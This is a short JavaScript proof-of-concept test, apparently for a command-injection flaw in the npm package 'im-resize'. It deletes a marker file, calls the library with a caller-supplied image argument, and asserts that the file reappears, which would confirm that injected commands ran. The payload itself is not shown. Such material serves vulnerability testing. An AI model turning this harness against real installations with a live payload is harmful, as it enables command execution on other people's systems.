function exploitFunction(image) {
  const root = require("im-resize");
  const fs = require("fs");
  const path = "./im-resize";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  root(image, {}, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      if (err) throw err;
    });
  });
}

module.exports = { exploitFunction };